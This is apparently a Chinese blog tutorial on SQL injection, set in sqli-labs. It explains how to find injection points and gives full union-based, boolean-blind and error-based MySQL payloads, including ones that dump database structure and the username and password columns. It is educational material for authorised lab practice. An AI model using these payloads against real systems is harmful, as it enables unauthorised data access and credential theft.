---
title: 'SQL 注入入门：注入点判断、联合注入、布尔盲注与报错注入'
date: 2026-08-18
description: '面向初学者的 SQL 注入入门指南：如何判断数字型/字符型注入点，以及联合注入、布尔盲注、报错注入三种常见利用方式的原理与完整 payload。'
draft: false
tags: [SQL注入, Web安全, 渗透测试, 联合注入, 盲注, 报错注入]
categories: [技术]
source: '🔒-安全/网络安全/未分类/微专业/Web/SQL注入/注入.md'
---

> **安全声明**：本文所有内容仅用于授权测试环境（如 sqli-labs、DVWA 等本地靶场）与安全学习研究，严禁用于任何未授权的目标。未经授权对他人系统进行注入测试属于违法行为。

SQL 注入（SQL Injection）是 Web 安全领域最常见也最基础的漏洞之一：攻击者把恶意的 SQL 语句拼接进原本的查询中，从而操作数据库。本文基于实战笔记整理，从注入点判断讲起，覆盖联合注入、布尔盲注、报错注入三种最常见的利用方式。

## 注入类型的判断

SQL 注入按参数类型大致分为两类：

1. **数字型**：参数直接拼进 SQL 且不加引号，如 `where id=$id`。
2. **字符型**：参数以字符串形式拼入，如 `where id='$id'`。

判断方法：在参数后拼接 `and 1=1` 与 `and 1=2`，观察页面差异。

- 输入 `http://example.com/abc.php?id=1 and 1=1`，页面正常返回 → 继续下一步；
- 输入 `http://example.com/abc.php?id=1 and 1=2`，页面报错或结果消失 → 说明条件生效，是**数字型注入**；
- 若两次页面都显示正常，说明 `and 1=2` 没被当作 SQL 执行，不是数字型注入，可考虑字符型。

## 判断注入点

数字型判断无效时，尝试用单引号闭合。以 sqli-labs 的经典字符型场景为例：

```mysql
?id=1' and 1=1--+
```

- 页面正常显示 → 单引号被成功闭合，`and 1=1` 生效；
- 把 `1=1` 换成 `1=2` 再试，页面不报错但**不返回数据** → 说明注入条件被正确执行，可以确定是字符型注入。

这里 `--+` 是 MySQL 的注释符：`--` 后面需要跟空格（URL 中 `+` 会被解码为空格），作用是把闭合单引号之后的剩余 SQL 注释掉，保证语法正确。

## 联合注入（Union-based）

联合注入利用 `union` 把两条查询结果合并输出，前提是**页面有回显**。SQL 注入中有个通用的注入顺序。

### 第一步：判断列数（order by）

用 `order by` 从 1 开始逐渐递增，当排序字段超出实际列数时报错，从而确定当前查询的列数：

```mysql
?id=1' order by 1--+
?id=1' order by 2--+
?id=1' order by 3--+
?id=1' order by 4--+   -- 报错，说明只有 3 列
```

### 第二步：判断数据显示位置

`union select` 的字段数必须与查询列数一致，先用数字占位，找到数据在页面上的回显位置：

```mysql
?id=0' union select 1,2,3--+
```

`id=0`（一个查不到数据的值）是为了让前一个查询结果为空，这样 `union` 后半段的结果才会显示出来。页面会把你传入的数字（如 2、3）原样输出，这些位置就是可以替换为 SQL 函数/查询的注入点。

### 第三步：依次爆破库、表、字段、数据

以 `security` 库、`user` 表为例（sqli-labs 场景），按从库到数据的顺序逐步深入：

**查看当前使用的数据库名：**

```mysql
?id=-1' union select 1,2,database()--+
```

**查询所有的库名：**

```mysql
?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
```

**查询指定库中的所有表名：**

```mysql
?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='security'--+
```

**查看表中所有列名：**

```mysql
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='user'--+
```

**查看某列的数据（如 username、password）：**

```mysql
?id=-1' union select 1,2,group_concat(username) from security.users--+
?id=-1' union select 1,2,group_concat(password) from security.users--+
```

`group_concat()` 可以把多行结果拼接成一行输出，配合 `information_schema` 元数据库即可遍历整个库结构。核心思路就是一条链路：**列数 → 回显位置 → 库名 → 表名 → 列名 → 数据**。

## 布尔盲注（Boolean-based Blind）

当页面**没有回显**（不显示查询结果），且报错也被屏蔽时，只能通过页面显示正常与否来逐字符猜数据，这就是布尔盲注。

其原理与前面判断注入点一致：构造一个布尔条件，条件为真时页面正常，为假时页面异常，通过二分法逐位猜测。

**截取字符串常用函数：**

- `mid()` / `substr()`：从指定位置截取子串，如 `substr((select database()),1,1)` 取出库名的第 1 个字符；
- `left()`：从左侧截取，如 `left((select database()),1)` 取前 1 个字符。

**典型判断语句（猜测当前库名首字符的 ASCII 值是否大于 100）：**

```mysql
?id=1' and ascii(substr((select database()),1,1))>100--+
```

页面正常 → 首字符 ASCII 大于 100；否则调小。配合二分法逐位推进，即可完整拼出目标字符串。逐字符注入很慢，生产环境中通常配合工具（如 sqlmap）完成。

## 报错注入（Error-based）

当页面**无回显但有报错信息**时，可以利用 MySQL 某些函数在传入非法参数时触发报错、并把错误信息带出数据，这就是报错注入。常见方式有以下几类。

### 1. floor() 报错注入

利用 `count(*)` + `group by` + `floor(rand(0)*2)` 产生主键冲突报错，把查询结果带进错误信息：

```mysql
?id=1' and (select 1 from (select count(*),concat(floor(rand(0)*2),0x7e,(select database()))x from information_schema.tables group by x)a)--+
```

`0x7e` 是 `~` 的十六进制，用作分隔标记，便于在报错信息中定位数据。

### 2. extractvalue() 报错注入

```mysql
?id=1' and extractvalue(1,concat(0x7e,(select database())))--+
```

### 3. updatexml() 报错注入

```mysql
updatexml(XML_document, XPath_string, new_value)
```

三个参数的含义：

- `XML_document`：string 格式，XML 文档对象的名称，例如 `Doc`；
- `XPath_string`：XPath 格式的路径字符串，注入点就在这个参数，传入不合法路径会触发报错；
- `new_value`：string 格式，替换查找到的符合条件的数据。

利用示例：

```mysql
?id=1' and updatexml(1,concat(0x7e,(select database())),1)--+
```

### 4. 解决报错信息长度限制（substring 分段提取）

`extractvalue()` 和 `updatexml()` 的报错输出长度有限（约 32 个字符），一次取不全数据时，可以用 `substring`（或 `mid`/`substr`）分段提取：

```mysql
select substring(group_concat(column_name,'@'),90,30)
```

该语句从拼接结果的第 90 个字符开始取 30 个字符，`@` 作为列之间的分隔符；不断调整起始偏移即可读完整段数据。

### 5. 其他报错方式

- **NAME_CONST() 报错注入**：利用 `NAME_CONST` 在传入非法常量组合时报错带出数据；
- **join() 报错注入**：利用 `join` 产生的重复列名错误来带出数据；
- **exp() 报错注入**：构造整数溢出触发报错，如 `and exp(~(select * from (select database())a))--+`。

## 小结

SQL 注入的利用流程可以概括为三步：**先判断类型与注入点，再判断回显与报错条件，最后选择对应注入方式提取数据**。

- 有回显 → 联合注入（`order by` 找列数 → `union select` 定位 → 逐级爆数据）；
- 无回显、报错被屏蔽 → 布尔盲注（`and` 条件 + 逐字符二分）；
- 无回显但有报错 → 报错注入（`floor` / `extractvalue` / `updatexml` 等）。

再次提醒：以上技术仅供在授权的靶场与测试环境中学习研究使用。

---

> 💡 **进阶**：想系统学透 SQL 注入？看这篇更全面的合集 [SQL 注入基础](/posts/sql-injection-basics/)，涵盖联合/报错/布尔/时间/堆叠/宽字节注入与 WAF 绕过技巧。
